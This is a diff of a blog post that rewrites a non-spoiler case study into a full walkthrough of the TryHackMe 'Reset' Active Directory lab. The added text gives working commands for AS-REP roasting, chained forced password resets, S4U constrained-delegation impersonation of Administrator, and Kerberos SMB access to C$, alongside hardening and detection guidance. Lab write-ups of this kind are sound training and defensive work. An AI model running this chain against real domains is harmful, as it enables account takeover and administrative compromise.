@@ -1,317 +1,468 @@
 ---
 layout: post
-title: "TryHackMe — Reset (Hard) | Active Directory Pentest: Technical Case Study"
+title: "TryHackMe Reset (Hard) — Full Active Directory Pentest Walkthrough"
 date: 2026-11-12 19:30:00 +0100
 categories: [TryHackMe, Active Directory]
-tags: [tryhackme, active-directory, windows, kerberos, bloodhound, acl, smb, pentest, red-team, delegation]
-description: "Evidence-based technical case study of TryHackMe Reset (Hard): Windows/AD enumeration, BloodHound methodology, Kerberos, authorization boundaries, reporting and detection."
+tags: [tryhackme, reset, active-directory, bloodhound, asrep-roasting, kerberos, constrained-delegation, impacket, smb, pentest, red-team]
+description: "Full, evidence-based walkthrough of TryHackMe Reset (Hard): SMB enumeration, AS-REP Roasting, BloodHound ACL analysis, delegated password resets, Kerberos S4U and SMB access. Credentials, hashes and flags redacted."
 mermaid: true
 ---
 
-> **Platform:** TryHackMe | **Room:** [Reset](https://tryhackme.com/room/resetui) | **Difficulty:** Hard | **Completed:** 30 October 2026 | **Author:** Kossi Richard Allado (allakori)
+> **Room:** [TryHackMe — Reset](https://tryhackme.com/room/resetui)  
+> **Difficulty:** Hard · **Completed:** 30 October 2026 · **Author:** Kossi Richard Allado (allakori)  
+> **Lab domain:** \`thm.corp\` · **Host:** \`HAYSTACK\` / \`haystack.thm.corp\` · **Lab IP during my session:** \`10.128.171.57\`  
+> **Sensitive values:** Passwords, cracked hashes and flag contents are **not published**.
 
-## Executive summary
+## 0. Introduction: what this write-up documents
 
-I completed the **Reset** Active Directory challenge, rated *Hard*, and verified both objectives on **30 October 2026**. My experience was unexpected: once I understood the domain's authorization relationships, I found the exercise much more straightforward than its difficulty label suggested. I described it afterward as the easiest Active Directory lab I had tackled.
+On **30 October 2026**, I completed **Reset**, an Active Directory challenge marked **Hard** on TryHackMe. Ironically, once I understood its permissions graph, it felt like **the easiest Active Directory room I had tackled so far**.
 
-What made it valuable was **the reasoning between tools**. A service scan cannot prove a vulnerable privilege boundary; a working credential does not guarantee WinRM access; and an edge in BloodHound is not itself a demonstrated compromise. The task is to connect observations, formulate hypotheses, validate actual permissions, and explain the impact.
+This is my technical reconstruction from the commands and outputs I retained during that session, not a claim that I have a perfect unbroken terminal recording. I have therefore marked three kinds of evidence throughout:
 
-**Publication boundary:** This is a technical, recruiter-readable **non-spoiler case study**. The room is not confirmed retired, so I am not distributing its specific attack chain, account-to-account escalation path, target-specific exploitation commands, passwords, answers or flags. TryHackMe's current [Acceptable Use Policy](https://tryhackme.com/legal/acceptable-use-policy) prohibits complete walkthroughs of active content. The content below still documents real findings and practical audit methodology. Generic command examples are labeled as examples; they are **not represented as copied outputs from my terminal**.
+- **Recorded:** I preserved the actual command or its output from my session. Where a command originally contained a password, only that argument is replaced with a variable or \`[REDACTED]\`.
+- **Reconstructed command:** Equivalent syntax for an operation I performed, but not a verbatim command I can prove I typed.
+- **Observed outcome:** My retained output establishes that the step worked; any omitted intermediate activity is called out explicitly.
 
-## 1. Assessment scope and evidence standard
+This distinction matters. A useful pentest report should help readers understand both **the exploit mechanics** and **the reliability of the evidence**.
 
-This was an authorized, isolated training environment, **not a client engagement**. The domain used Microsoft Windows and Active Directory, exposing a range of authentication, file-sharing and management services.
+### Attack chain overview
 
-I used the following evidence categories in my notes:
+Here is the actual progression I documented, with no secrets exposed:
 
-| Category | Meaning | Appropriate language in a report |
+\`\`\`mermaid
+flowchart TD
+    A["HAYSTACK / THM.CORP<br/>Windows & AD enumeration"] --> B["Anonymous SMB access<br/>Data/onboarding documents"]
+    B --> C["Domain identity discovery<br/>AS-REP Roasting"]
+    C --> D["TABATHA_BRITT<br/>Cracked AS-REP credentials"]
+    D --> E["BloodHound: GenericAll<br/>control over SHAWNA_BRAY"]
+    E --> F["SHAWNA_BRAY<br/>ForceChangePassword"]
+    F --> G["CRUZ_HALL<br/>ForceChangePassword"]
+    G --> H["DARLA_WINTERS<br/>Kerberos constrained delegation"]
+    H --> I["S4U2Self / S4U2Proxy<br/>Administrator CIFS service ticket"]
+    I --> J["Kerberos SMB access to C$<br/>Both room objectives verified"]
+\`\`\`
+
+**Important nuance:** My preserved initial SMB-document evidence does not demonstrate every step by which I derived the AS-REP target list. I do **not** present a third-party foothold technique as my own when I do not have its original terminal evidence.
+
+## 1. Reconnaissance — identify the domain controller
+
+I started with service enumeration against the lab-provided IP. The **observed open ports** in the retained scan were:
+
+| TCP port | Service / role | Why it mattered |
 | --- | --- | --- |
-| **Observed** | A saved command or terminal result supports the fact directly | “The test returned…” |
-| **Validated** | The operation succeeded and demonstrated a specific permission or capability | “This account could perform…” |
-| **Inferred** | The hypothesis is plausible but the exact evidence is missing | “This may indicate…” |
-| **Reference** | A general technique confirmed by documentation or independent research | “The tool supports…” |
+| 53 | DNS | Windows domain name resolution |
+| 88, 464 | Kerberos / kpasswd | Domain authentication and credential policy |
+| 135, 139 | RPC / NetBIOS | Windows remote procedure and discovery interfaces |
+| 389 | LDAP | Domain objects and identities |
+| 445 | SMB | Shared files, authentication and share permissions |
+| 593 | RPC over HTTP | Additional Windows RPC surface |
+| 636 | LDAPS-facing endpoint | TLS/LDAP surface; scan result requires interpretation |
+| 3268, 3269 | Global Catalog | Directory queries |
+| 3389 | RDP | Remote desktop, not proof that a user may log in |
+| 5985 | WinRM / HTTP | Remote PowerShell administration |
 
-**Recorded outcome:** I completed both objectives. My retained notes also document an initial network assessment, SMB/document inspection, an offline password-recovery stage, BloodHound relationship analysis, and a later Kerberos-authenticated service-access stage. I have preserved the machine-specific sequence separately.
+The host identified itself as **HAYSTACK** in the **THM.CORP** domain. The environment was clearly Windows/Active Directory.
 
-## 2. Reconnaissance — make every port answer a question
+### Nmap — reproducible command
 
-Windows domain assessments generate a lot of noise. A useful first pass answers three questions:
+The *specific full original scan invocation* was not preserved; the following reproduces the relevant discovery approach:
 
-1. What services are **reachable**?
-2. Which ones expose information to **anonymous or low-privileged** identities?
-3. Which ones can support **authenticated security validation**, if I obtain authorized test credentials?
+\`\`\`bash
+# Reconstructed equivalent — the IP is from my session, not a permanent room IP.
+nmap -Pn -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985 \
+  10.128.171.57
+\`\`\`
 
-My original assessment found Windows services including Kerberos, LDAP, SMB and RPC. I also checked the management and TLS-facing surfaces rather than assuming every advertised port was usable.
+**Takeaway:** An open port is a lead, not a vulnerability. For this machine, SMB, Kerberos and LDAP were more useful investigative starting points than treating every service as independently exploitable.
 
-### Tooling reference: targeted Nmap inventory
+## 2. SMB: anonymous access and onboarding material
 
-The following is a **generic authorized-lab example**, not the original room-specific command:
+My recorded command to interact with the **Data** share did **not** require a domain password:
 
-~~~bash
-# Example only. Set LAB_IP to your own authorized target.
-nmap -Pn -sV -p 53,88,135,139,389,445,464,636,3268,3269,5985 LAB_IP
-~~~
+\`\`\`bash
+# Recorded in the October 30 session:
+smbclient //10.128.171.57/data -N
+\`\`\`
 
-| Typical port | Function | Why I investigate it |
-| --- | --- | --- |
-| 53 | DNS | Domain discovery and name resolution |
-| 88 / 464 | Kerberos | Realm, authentication and credential-management boundaries |
-| 135 / 139 / 445 | RPC / NetBIOS / SMB | File-sharing permissions, RPC interfaces and Windows environment context |
-| 389 / 636 | LDAP / LDAPS | Directory objects, identity relations and transport protection |
-| 3268 / 3269 | Global Catalog | Cross-domain directory discovery, where available |
-| 5985 / 5986 | WinRM | Remote-management exposure **and** authorization requirements |
+The accessible content included an \`onboarding\` directory. My session recorded a PDF with a randomized-looking filename:
 
-**Interpretation:** Seeing TCP/445 open is a finding about exposure; it does **not** establish that a share can be read, that files are sensitive or that the host is compromised.
+\`\`\`text
+x5oa55w5.0vj.pdf    3032659 bytes
+\`\`\`
 
-### Evidence capture
+The file was an onboarding message associated with the user **LILY_ONEILL**. Its text contained a reset/initial-password instruction.
 
-For a professional report I normally retain the date/time, the exact command, the network scope and a brief interpretation. Service banners can help identify a technology stack but should not be treated as definitive proof of a vulnerability without verification.
+I intentionally do **not** reproduce that password. The important weakness was not the exact string: an onboarding document accessible to the wrong security context exposed authentication material.
 
-## 3. SMB review — listing a share is not the same as reading it
+### Extract text locally
 
-SMB access deserves multiple checks. An unauthenticated session, guest mapping and a domain-authenticated session can all have different effective rights.
+I used SMB file retrieval and text extraction. The *exact original download sequence* was not retained; the following is equivalent syntax for **reading a downloaded PDF**, not an invented screenshot of my terminal:
 
-A useful permission matrix is:
+\`\`\`bash
+# After downloading an authorized test document:
+pdftotext -layout x5oa55w5.0vj.pdf -
+\`\`\`
 
-| Test | Question | Correct conclusion if successful |
-| --- | --- | --- |
-| Enumerate share names | Which resources are advertised? | Names are visible to the session |
-| List a share directory | Can this identity list contents? | Directory-listing permission is present |
-| Read a file | Does the identity have effective file-read rights? | That particular file is readable |
-| Examine the content | Is exposed data actually sensitive? | A finding depends on what was disclosed |
-| Retest another identity | Is the permission appropriately restricted? | Compare the impact of different security contexts |
+**Observed:** SMB share access and the onboarding PDF.  
+**Not independently preserved:** The exact contents of my initial SMB \`get\` command and a complete transcript linking that document to all later credentials.
 
-### Tooling reference: SMB authorization checks
+**Why it matters:** Anonymous or overly broad share permissions are especially dangerous when scripts, onboarding templates and operational documents contain authentication details. A professional audit needs to record *who could read what*, not simply list share names.
 
-~~~bash
-# Generic examples, not a copied Reset solution.
-smbclient -L //LAB_IP -N
-nxc smb LAB_IP -u '' -p '' --shares
-# With an authorized test identity:
-nxc smb LAB_IP -u TEST_USER -p 'TEST_PASSWORD' --shares
-~~~
+## 3. Kerberos: AS-REP Roasting
 
-**A key observation from my lab work** was that the value of shared documents comes from their content and associated access rights, not simply from their filenames. A file that looks like ordinary onboarding or operations material should be examined for excessive disclosure, while avoiding the publication of real credentials.
+I subsequently identified a domain account vulnerable to **AS-REP Roasting**: **TABATHA_BRITT**.
 
-For document review in an authorized environment, a useful **generic** local command is:
+Normally, Kerberos pre-authentication helps prevent obtaining an AS-REP response for arbitrary accounts without first demonstrating knowledge of the account's secret. When a user is configured without this requirement, an attacker may request encrypted AS-REP material and test password guesses **offline**.
 
-~~~bash
-pdftotext -layout local_document.pdf -
-~~~
+This does not itself confer administrator privileges: the real impact depends on whether the password can be recovered and which rights the account possesses.
 
-This produces text for inspection. It does **not** determine the sensitivity of a file by itself: that requires a human review of its purpose, access permissions and content.
+### Requesting AS-REP material
 
-**Defensive angle:** remove secrets from onboarding documents and scripts, restrict anonymous read/write access, and rotate any exposed credentials. A share ACL is a security control; an administrative naming convention is not.
+My retained session contains the successful cracking operation, but does **not** preserve the exact command that originally requested the AS-REP data. Here is the equivalent Impacket syntax, clearly labeled **reconstructed**:
 
-## 4. Identity testing — authentication is not authorization
+\`\`\`bash
+# Reconstructed equivalent, not claimed as a verbatim historical command.
+# users.txt is a candidate username list from an authorized domain lab.
+impacket-GetNPUsers 'thm.corp/' \
+  -usersfile users.txt -no-pass -request \
+  -format john -outputfile asrep.hashes \
+  -dc-ip 10.128.171.57
+\`\`\`
 
-A frequent source of mistakes in beginner write-ups is treating a recovered password as though it automatically provides interactive access to a server.
+The format and filename are important: John the Ripper needs correctly formatted AS-REP material, and a saved file makes the offline step repeatable.
 
-It doesn't.
+### John the Ripper — recorded command
 
-| Security boundary | Evidence required |
-| --- | --- |
-| Correct account/password | Authentication accepted by the relevant service |
-| Remote management allowed | Successful authorized WinRM, RDP or equivalent session |
-| Access to a share | Actual directory/file operation succeeds |
-| Control over a user object | Authorized operation within the object's effective ACL |
-| Sensitive service access | The target service accepts the identity or ticket for the tested action |
+The actual John command from my October terminal history was:
 
-This distinction helped keep the Reset assessment reproducible and the conclusions defensible.
-
-### Kerberos pre-authentication and offline password security
-
-One general identity risk is a domain account configured without Kerberos pre-authentication. Such a setting can allow an attacker to obtain authentication material and attempt an **offline dictionary attack**; successful cracking still says nothing, by itself, about WinRM permissions or domain administration.
-
-The following is a **tool syntax reference** for a permitted lab, not the target-account command from Reset:
-
-~~~bash
-# Offline analysis of an AS-REP test capture from an authorized lab.
+\`\`\`bash
 john --format=krb5asrep \
   --wordlist=/usr/share/wordlists/rockyou.txt \
   asrep.hashes
-~~~
+\`\`\`
 
-The relevant security controls are to require pre-authentication where possible, enforce strong passwords, review exception accounts and correlate unusual Kerberos requests with subsequent authentication attempts.
+**Recorded result, sanitized:**
 
-**Do not interpret a cracked password as an automatic compromise of the domain.** Report the concrete rights validated with that credential.
+\`\`\`text
+[REDACTED PASSWORD]  ($krb5asrep$23$TABATHA_BRITT@THM.CORP)
+\`\`\`
 
-## 5. BloodHound — understanding the permission graph
+This means a password was recovered for **TABATHA_BRITT**, not that a privileged shell had already been obtained. The hash and password bytes are intentionally withheld.
 
-This was the most instructive part of the exercise for me. BloodHound changes the focus from individual tools to **who can control whom, under what conditions**.
+### Validate the identity using NetExec
 
-My retained collection output reported:
+The original successful SMB validation command used \`nxc smb\` with **TABATHA_BRITT**. Below the password is supplied interactively rather than copied from the original command line:
 
-- **42 users**
-- **55 groups**
-- **3 GPOs**
-- **222 organizational units**
+\`\`\`bash
+read -rsp 'TABATHA_BRITT password: ' TABATHA_PASS; echo
 
-These are **counts from my original collection**, not a claim that all those objects were vulnerable.
+nxc smb 10.128.171.57 \
+  -u TABATHA_BRITT -p "$TABATHA_PASS" -d thm.corp
+\`\`\`
 
-### What to look for in an AD graph
+**Observed result:** SMB authentication succeeded. A separate WinRM attempt with the same account **failed to establish an interactive shell**.
 
-| Edge / condition | Security significance | What must be confirmed |
+That difference is critical:
+
+- **Authentication works**: the account and password are valid for the tested service.
+- **WinRM authorization works**: the account is permitted to create a remote-management session.
+- **AD object rights work**: the account may perform specific delegated directory operations.
+
+These are distinct privileges. A failed WinRM login is not proof that an account is useless.
+
+## 4. BloodHound: turn domain rights into a testable path
+
+With an authenticated domain identity, I collected Active Directory relationship information using BloodHound-Python.
+
+### Recorded BloodHound collection, password redacted
+
+This is the original tool/argument structure from my session; only the inline password is replaced with the shell variable already defined above:
+
+\`\`\`bash
+bloodhound-python \
+  -u TABATHA_BRITT -p "$TABATHA_PASS" \
+  -d thm.corp -ns 10.128.171.57 -c all
+\`\`\`
+
+The **recorded collection output** reported:
+
+\`\`\`text
+Found 42 users
+Found 55 groups
+Found 3 gpos
+Found 222 ous
+Found 19 containers
+Found 0 trusts
+\`\`\`
+
+These counts describe collected directory objects; they are **not** counts of vulnerabilities or compromised accounts.
+
+BloodHound's real value is in relations between **principals**, **objects**, and **effective permissions**. The path I identified was:
+
+\`\`\`text
+TABATHA_BRITT
+    |
+    | GenericAll
+    v
+SHAWNA_BRAY
+    |
+    | ForceChangePassword
+    v
+CRUZ_HALL
+    |
+    | ForceChangePassword
+    v
+DARLA_WINTERS
+    |
+    | Kerberos constrained delegation
+    v
+CIFS service on haystack.thm.corp
+\`\`\`
+
+### Why these edges matter
+
+**GenericAll:** The principal can exercise very broad control over the target AD object. If a user object is controlled in this way, the attacker may be able to modify security-relevant properties, including the credential state, depending on the effective permission and protections.
+
+**ForceChangePassword:** This delegated right can permit a principal to **reset the target account's password without knowing its previous password**. It is distinct from knowing or cracking that password.
+
+**Constrained delegation:** A trusted service account may request tickets to specific downstream SPNs on behalf of another identity. Compromise of the account that controls this configuration can cross a particularly sensitive identity boundary.
+
+The key mistake would be to treat every BloodHound edge as automatically exploitable. Here, I **validated the sequence** by changing the relevant test-account passwords and authenticating with each new identity.
+
+## 5. Chaining password-reset rights
+
+My October terminal session contained three successful password-reset operations using Samba's \`net rpc password\` command:
+
+1. **TABATHA_BRITT → SHAWNA_BRAY**, enabled by \`GenericAll\`.
+2. **SHAWNA_BRAY → CRUZ_HALL**, using \`ForceChangePassword\`.
+3. **CRUZ_HALL → DARLA_WINTERS**, using \`ForceChangePassword\`.
+
+Below are the **same operation patterns**, with passwords replaced by variables. The actual commands I ran used inline secrets; I do not republish them.
+
+### 5.1 TABATHA_BRITT controls SHAWNA_BRAY
+
+\`\`\`bash
+# Prompt for a password without exposing it in this write-up.
+read -rsp 'New lab password for SHAWNA_BRAY: ' SHAWNA_PASS; echo
+
+net rpc password 'SHAWNA_BRAY' "$SHAWNA_PASS" \
+  -U "THM.CORP/TABATHA_BRITT%$TABATHA_PASS" \
+  -S haystack.thm.corp
+\`\`\`
+
+**Expected behavior and observed outcome:** The command succeeded in my session; the newly controlled identity could then be used in authenticated tests.
+
+### 5.2 SHAWNA_BRAY controls CRUZ_HALL
+
+\`\`\`bash
+read -rsp 'New lab password for CRUZ_HALL: ' CRUZ_PASS; echo
+
+net rpc password 'CRUZ_HALL' "$CRUZ_PASS" \
+  -U "THM.CORP/SHAWNA_BRAY%$SHAWNA_PASS" \
+  -S haystack.thm.corp
+\`\`\`
+
+**Observed outcome:** The operation worked, and later credentials for **CRUZ_HALL** were successfully validated.
+
+### 5.3 CRUZ_HALL controls DARLA_WINTERS
+
+\`\`\`bash
+read -rsp 'New lab password for DARLA_WINTERS: ' DARLA_PASS; echo
+
+net rpc password 'DARLA_WINTERS' "$DARLA_PASS" \
+  -U "THM.CORP/CRUZ_HALL%$CRUZ_PASS" \
+  -S haystack.thm.corp
+\`\`\`
+
+**Observed outcome:** This gave me control of the identity **DARLA_WINTERS**, the key account for the next phase.
+
+### Why this technique worked
+
+Each step was authorized by an **overly permissive AD object relationship**. No previous target-account password was needed for a delegated reset. The escalated capability came from the *ACL*, not from cracking three additional hashes.
+
+For each reset, validating SMB authentication with the resulting identity is more meaningful than merely assuming the password changed because a command returned without a visible exception.
+
+**A practical lesson:** If a domain user has no direct route to an administrator group, inspect the **transitive rights graph**. Delegated administration can unintentionally connect several apparently low-privilege identities to a high-impact service account.
+
+## 6. Kerberos constrained delegation — S4U2Self and S4U2Proxy
+
+Once I controlled **DARLA_WINTERS**, I investigated the delegated service access represented in the AD data.
+
+### What's happening technically?
+
+For a properly configured constrained-delegation scenario, the S4U extensions let an eligible service obtain a service ticket for a user:
+
+- **S4U2Self:** the service requests a ticket to itself representing the named user, within the applicable Kerberos rules.
+- **S4U2Proxy:** the service uses the prior ticket to request a ticket for a permitted downstream service principal.
+- **SPN:** the service principal name specifies which service the final ticket is intended for.
+
+This matters because **a service ticket is not the user's password**. The ticket can confer access to a particular service without the attacker ever learning that user's secret.
+
+### Impacket getST — actual successful command, secret redacted
+
+This command was **executed in my session**. Only the password argument is substituted:
+
+\`\`\`bash
+impacket-getST \
+  -spn 'cifs/haystack.thm.corp' \
+  -impersonate Administrator \
+  -dc-ip 10.128.171.57 \
+  "thm.corp/DARLA_WINTERS:$DARLA_PASS"
+\`\`\`
+
+**The actual command output included the following lines:**
+
+\`\`\`text
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in Administrator@cifs_haystack.thm.corp@THM.CORP.ccache
+\`\`\`
+
+These are the decisive facts:
+
+1. The operation progressed through **both S4U stages**.
+2. The requested impersonated identity was **Administrator**.
+3. The resulting ticket was for the **CIFS** service on the target host.
+4. Impacket wrote a local **Kerberos cache** file.
+
+**What this does not prove:** I did not recover the Administrator's plaintext password. My next step was to prove the actual scope of access by using the ticket.
+
+## 7. Kerberos SMB access and verification of both objectives
+
+### 7.1 Set the ticket cache
+
+This exact export command was recorded in my terminal:
+
+\`\`\`bash
+export KRB5CCNAME="$PWD/Administrator@cifs_haystack.thm.corp@THM.CORP.ccache"
+\`\`\`
+
+\`KRB5CCNAME\` tells Kerberos-aware clients which cache to consult. It is easy to confuse a valid ticket with a usable ticket: a wrong cache path, host name or SPN can make the final command fail even if ticket issuance succeeded.
+
+### 7.2 Connect with Impacket SMBClient
+
+The next command is **verbatim from my successful session**:
+
+\`\`\`bash
+impacket-smbclient -k -no-pass -target-ip 10.128.171.57 \
+  'thm.corp/Administrator@haystack.thm.corp'
+\`\`\`
+
+Why these options?
+
+- \`-k\`: use Kerberos authentication.
+- \`-no-pass\`: do not prompt for or supply an account password; rely on existing Kerberos material.
+- \`-target-ip\`: specify the lab IP while preserving the DNS/SPN host name in the target identity.
+
+A successful SMB connection demonstrates that the **CIFS service accepted the ticket**. It should not be described as a full Administrator interactive shell or as knowledge of the Administrator password.
+
+### 7.3 Inspect the administrative share
+
+My retained interaction then navigated through the SMB client:
+
+\`\`\`text
+shares
+use C$
+cd Users
+cd Administrator
+cd Desktop
+cat root.txt
+\`\`\`
+
+**Observed:** The room's root objective was present in the Administrator Desktop location and was successfully retrieved.
+
+I also reached the \`automate\` user profile and verified \`user.txt\`. **Neither value is included here.**
+
+\`\`\`text
+Objective 1: user.txt — VERIFIED (contents withheld)
+Objective 2: root.txt — VERIFIED (contents withheld)
+\`\`\`
+
+This gave me a concrete, validated result beyond graph analysis or ticket issuance: the delegated authentication path provided access to a sensitive administrative file share.
+
+## 8. Root-cause analysis
+
+The point of a write-up is not simply that a series of commands worked. It should explain the organizational and technical conditions that allowed them to work.
+
+| Finding | Root cause | Security impact |
 | --- | --- | --- |
-| **GenericAll** | Broad control over an object may make security-sensitive modifications possible | Source principal, target object, actual effective permission |
-| **ForceChangePassword** | An actor may have delegated ability to reset another identity's password | The target, permission scope and whether the action is authorized |
-| **WriteDACL** | An actor may be able to alter an object's access-control list | The rights granted and possible downstream effect |
-| **GenericWrite** | Write permission over some object attributes | Which writable attributes have security impact |
-| **Group membership** | Membership can confer access through nested groups | Effective, not merely nominal, group privileges |
-| **Delegation attributes** | A service identity may be allowed to act for users in a defined context | Delegation type, target services and identity restrictions |
+| Excessive exposure of onboarding material | Shared files reachable outside the intended user population | Credentials or operational details may leak |
+| AS-REP Roastable account with a weak password | Kerberos pre-authentication exception and inadequate password strength | Offline password recovery against a domain identity |
+| Overly permissive AD object ACLs | Excessive \`GenericAll\` and delegated password-reset authority | Transitive control of additional identities |
+| Sensitive constrained delegation | Delegation permissions assigned to an account reachable through the ACL chain | Service-ticket impersonation to sensitive service access |
 
-The right question is not just **“Where is the shortest path?”** It is:
+These findings reinforce a central lesson: **security impact is compositional**. A single weak password might not provide remote shell access. Several rights that appear unimportant on their own can combine into a much more serious path.
 
-> What exact control exists, why does it exist, can it be exercised in the current context, and what security boundary would be crossed?
+## 9. Blue Team: hardening and detection
 
-### Interpreting a BloodHound result
+### Preventive controls
 
-A graph edge may reflect configuration, historical collection data or a right with operational restrictions. For a professional assessment, I would:
+1. Remove initial credentials and other secrets from broadly accessible onboarding material; review SMB ACLs and guest/anonymous access.
+2. Require Kerberos pre-authentication for normal user accounts and review exceptions; improve password quality.
+3. Audit AD ACL assignments, especially \`GenericAll\`, \`GenericWrite\`, \`WriteDACL\` and \`ForceChangePassword\` on sensitive objects.
+4. Reduce transitive administrative rights: investigate **who can reset an account that itself controls another privileged identity**.
+5. Restrict Kerberos delegation to the minimum required SPNs and protect service accounts from unnecessary object-control permissions.
+6. Review sensitive share permissions and service-account access, and retest each control after modification.
 
-1. Capture the relevant edge and its underlying object attributes.
-2. Identify the assigning principal and whether the permission is direct or inherited.
-3. Evaluate the business need for that delegation.
-4. Test the effective right only within the approved scope.
-5. Distinguish a **theoretical path** from an **observed authorization failure**.
+### Relevant detection hypotheses
 
-**Why it matters:** The best remediation is often to remove one excessive delegated right that enables several potential escalation paths, rather than attempting to detect every individual exploitation tool.
+The following Windows security events are **defensive telemetry recommendations**, **not** a claim that these log lines were collected in my lab session:
 
-The specific account names and edge-by-edge route from Reset are **not** shown in this public document.
-
-## 6. Kerberos tickets and constrained delegation
-
-Kerberos delegation allows certain services to access other services on a user's behalf. It is legitimate enterprise functionality, but its trust boundaries require careful review.
-
-Three technical terms are important:
-
-- **TGT:** Ticket-Granting Ticket, used to obtain service tickets.
-- **TGS/service ticket:** ticket intended for a particular service principal name (**SPN**).
-- **S4U:** Kerberos extensions supporting service-side impersonation and delegation scenarios under applicable configuration and policy.
-
-The distinction between **holding a ticket** and **being able to use it** matters. A ticket may be valid for one SPN and still be useless for another operation.
-
-### Ticket inspection without publishing secrets
-
-The following is generic diagnostic syntax for a ticket cache in an authorized assessment:
-
-~~~bash
-# Generic Kerberos cache inspection. Do not publish the actual cache.
-export KRB5CCNAME=/path/to/authorized-lab-ticket.ccache
-klist
-~~~
-
-A useful note should record the ticket's intended service, identity context, validity and the exact permitted operation tested — without uploading a reusable ticket, password, hash or flag.
-
-### What defenders should audit
-
-- Accounts allowed to delegate and the list of permitted services.
-- Changes to delegation-related directory attributes.
-- Permissions over sensitive service accounts.
-- Whether privileged identities are protected from inappropriate delegation.
-- Service-ticket requests inconsistent with expected application behavior.
-
-**Impact must be service-specific.** A ticket accepted by one service does not automatically imply control of all services or knowledge of a privileged account's password.
-
-## 7. Investigation workflow: what to do when stuck
-
-This is an **audit decision workflow**, not a diagram of the room's solution:
-
-~~~mermaid
-flowchart TD
-    A["Collect authorized scope and service evidence"] --> B["Identify tested security boundary"]
-    B --> C{"Is the observation reproducible?"}
-    C -- "No" --> D["Check name resolution, rights, errors and assumptions"]
-    D --> B
-    C -- "Yes" --> E["Document actual identity, capability and limits"]
-    E --> F{"Is the security impact demonstrated?"}
-    F -- "Not yet" --> G["Create a narrower, testable hypothesis"]
-    G --> B
-    F -- "Yes" --> H["Write finding, remediation and retest criteria"]
-~~~
-
-When a test fails, I do not simply replace the command with another tool. I ask whether the failure comes from:
-
-- Authentication: invalid or incorrectly formatted credentials.
-- Authorization: a valid identity without permission to perform the action.
-- Service configuration: the protocol is unavailable or disabled.
-- Kerberos naming: DNS, domain, SPN or ticket-cache mismatch.
-- Evidence quality: the information collected does not support the current hypothesis.
-
-This practice also prevents a common reporting mistake: converting a failed hypothesis into a claimed success after reading someone else's write-up.
-
-## 8. Detection and logging opportunities
-
-The following are **defender-oriented investigation ideas**, not a claim that these exact event IDs appeared in my retained Reset logs.
-
-| Activity to investigate | Relevant Windows telemetry | Interpretation caution |
+| Activity | Candidate telemetry | What analysts should correlate |
 | --- | --- | --- |
-| Unusual authentication requests | **4768**, **4769** | Correlate with normal service behavior and identity baseline |
-| Account password resets | **4724** | Legitimate help-desk changes can create similar events |
-| Sensitive account changes | **4738**, **5136** when applicable and audited | Requires appropriate directory auditing |
-| Access to file shares | **5140**, **5145** with suitable auditing | Share access alone may be expected |
-| Changes to sensitive directory rights | **5136**, **4670** in relevant contexts | Check whether the object and auditing settings support the event |
-| Sensitive directory replication activities | **4662** with relevant SACLs | Not all 4662 events indicate malicious replication |
+| Unusual Kerberos requests | 4768, 4769 | Account baseline, source, ticket pattern |
+| Password resets | 4724 | Initiator, target, time, delegated-right justification |
+| AD object changes | 5136 where configured | Target DN, attribute modified, actor |
+| AD permission changes | 4670 / directory auditing as applicable | Permission origin and effective security boundary |
+| Share access | 5140, 5145 with auditing enabled | Sensitive paths, identity and read/write action |
+| Privileged service access | Authentication and file-access logs | Ticket use, unexpected access to sensitive resources |
 
-A meaningful alert often needs **context across sources**: who initiated the change, which object was targeted, whether it was in a maintenance window, what happened next, and whether the event reflects a normal business process.
+No single event is conclusive. Correlation across identity, Kerberos and file-access telemetry is far more useful than a rule that matches only one tool name.
 
-## 9. Converting lab work into a professional finding
+## 10. What I would include in a professional pentest report
 
-The report should show what was *verified*, not simply list impressive tool names. Here is the reporting format I use.
+In a client-facing report, I would separate **the evidence, the root cause and the demonstrated impact**:
 
-| Field | Content |
+- **Scope:** authorized host(s), domain, time window and test identity.
+- **Methodology:** service mapping, SMB inspection, credential validation and identity-permission analysis.
+- **Evidence:** commands and relevant **redacted** output, screenshots, permissions and their context.
+- **Exploitability:** prerequisites for each action, including the difference between authentication and authorization.
+- **Impact:** exactly which service or administrative action the controlled identity enabled.
+- **Remediation:** minimum necessary ACLs, account hardening, delegation restrictions.
+- **Retest:** prove the unauthorized path no longer functions while legitimate delegated workflows remain operational.
+
+### Evidence provenance
+
+| Step | Status of my October 30 record |
 | --- | --- |
-| **Finding** | Specific misconfiguration or excessive permission |
-| **Scope** | Affected identity or service class, with sensitive details removed |
-| **Preconditions** | Access level needed before the issue can be exercised |
-| **Evidence** | Saved output, its time, relevant sanitized fields |
-| **Root cause** | Why the configuration permitted the unexpected behavior |
-| **Impact** | Exactly which security boundary was crossed |
-| **Severity** | Based on prerequisites and demonstrated impact, not tool reputation |
-| **Remediation** | Implementable changes with an accountable owner |
-| **Retest** | Observable condition that proves the control now works |
+| Lab completion and difficulty | **Recorded** |
+| Host/domain/port observations | **Recorded** |
+| Anonymous SMB and onboarding PDF | **Recorded** |
+| Full original SMB download command | **Not preserved; equivalent shown** |
+| Original AS-REP request command | **Not preserved; equivalent shown** |
+| John crack of \`TABATHA_BRITT\` | **Recorded** |
+| NetExec authentication; WinRM failure | **Recorded** |
+| BloodHound collection and object counts | **Recorded** |
+| Permission relationships | **Recorded** |
+| Three \`net rpc password\` operations | **Recorded; credentials redacted** |
+| \`impacket-getST\` S4U request and output | **Recorded; credential redacted** |
+| \`KRB5CCNAME\` and Kerberos SMB client | **Recorded verbatim** |
+| Both room objectives | **Verified; flag values withheld** |
 
-### Finding A: excessive access to operational material
+## 11. Conclusion
 
-**Risk:** Overly broad access to documents or scripts may expose information useful to an attacker.
+Reset was rated **Hard**, but it became surprisingly straightforward once I followed the **Active Directory permission relationships** instead of searching endlessly for an unrelated exploit. The central sequence was:
 
-**Recommendation:** Restrict access by role, remove embedded secrets, audit anonymous and guest permissions, and monitor read/write operations on sensitive shares.
+**Kerberos credential recovery → ACL-based identity control → constrained delegation → service-specific Kerberos authentication → verified access.**
 
-**Retest:** Use an unauthorized low-privilege test identity and verify that sensitive file reads are rejected while legitimate workflows still function.
+The strongest takeaway is broader than the room: a penetration tester should understand **why a permission exists, who can use it, and what boundary it crosses**. Successful pentesting is not a checklist of commands; it is a reproducible argument supported by evidence.
 
-### Finding B: transitive delegated control in Active Directory
-
